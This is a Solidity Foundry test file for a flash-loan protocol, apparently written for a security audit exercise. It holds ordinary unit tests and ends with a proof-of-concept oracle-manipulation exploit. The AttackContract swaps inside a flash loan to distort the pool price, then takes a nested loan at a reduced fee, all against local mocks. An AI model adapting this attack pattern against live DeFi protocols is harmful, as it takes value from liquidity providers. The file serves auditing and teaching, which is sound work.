// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import { IFlashLoanReceiver } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { BuffMockTSwap } from "../mocks/BuffMockTSwap.sol";
import { BuffMockPoolFactory } from "../mocks/BuffMockPoolFactory.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public view {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }

    /*//////////////////////////////////////////////////////////////
                          ORACLE MANIPULATION
    //////////////////////////////////////////////////////////////*/

    function test_OracleManipulation() public {
        // 1. Set up mocks
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSwap
        uint256 liquidityProviderTokenAmount = 100e18;
        uint256 liquidityProviderWethAmount = 100e18;
        uint256 liquidityProviderLPTokensAmount = 100e18;
        // Fund and deposit
        vm.startPrank(liquidityProvider);
        weth.mint(liquidityProvider, liquidityProviderWethAmount);
        weth.approve(address(tswapPool), liquidityProviderWethAmount);
        tokenA.mint(liquidityProvider, liquidityProviderTokenAmount);
        tokenA.approve(address(tswapPool), liquidityProviderTokenAmount);
        BuffMockTSwap(tswapPool).deposit(liquidityProviderWethAmount, liquidityProviderLPTokensAmount, liquidityProviderTokenAmount, block.timestamp);
        vm.stopPrank();

        // 3. Fund ThunderLoan
        uint256 liquidityProviderTokenAmountTL = 1000e18;
        // Set allow
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        // Fund and deposit
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, liquidityProviderTokenAmountTL);
        tokenA.approve(address(thunderLoan), liquidityProviderTokenAmountTL);
        thunderLoan.deposit(tokenA, liquidityProviderTokenAmountTL);
        vm.stopPrank();

        // 4. Take out 2 Thunder Loans
        //  a. Severely impact swap price of TSwap pool
        //  b. Show that doing so will significantly reduce fees
        uint256 standardLoanAmount= 100e18;
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, standardLoanAmount);   // 296_147_410_319_118_389 :: 0.296147410319118389
        console.log("Normal fee: ", normalFeeCost);

        uint256 amountToBorrow = 50e18;
        AttackContract attackContract = new AttackContract(address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));

        vm.startPrank(user);
        tokenA.mint(address(attackContract), 100e18);
        thunderLoan.flashloan(address(attackContract), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = attackContract.feeOne() + attackContract.feeTwo();
        console.log("Attack fee: ", attackFee);                                             // 214_167_600_932_190_305 :: 0.214167600932190305
        assert(attackFee < normalFeeCost);
    }
}

contract AttackContract is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    BuffMockTSwap tswapPool;
    address repayAddress;

    bool attacked = false;
    uint256 public feeOne;
    uint256 public feeTwo;

    constructor(address _tswapPool, address _thunderLoanAddress, address _repayAddress) {
        thunderLoan = ThunderLoan(_thunderLoanAddress);
        tswapPool = BuffMockTSwap(_tswapPool);
        repayAddress = _repayAddress;
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns(bool) {
        if (!attacked) {
            feeOne = fee;
            attacked = true;
            uint256 wethbought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
            IERC20(token).approve(address(tswapPool), 50e18);
            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethbought, block.timestamp);

            // Call flashloan again
            thunderLoan.flashloan(address(this), IERC20(token), amount, "");
            // Repay
            IERC20(token).transfer(repayAddress, amount + fee);
        } else {
            feeTwo = fee;
            // Repay
            IERC20(token).transfer(repayAddress, amount + fee);
        }
    }

}
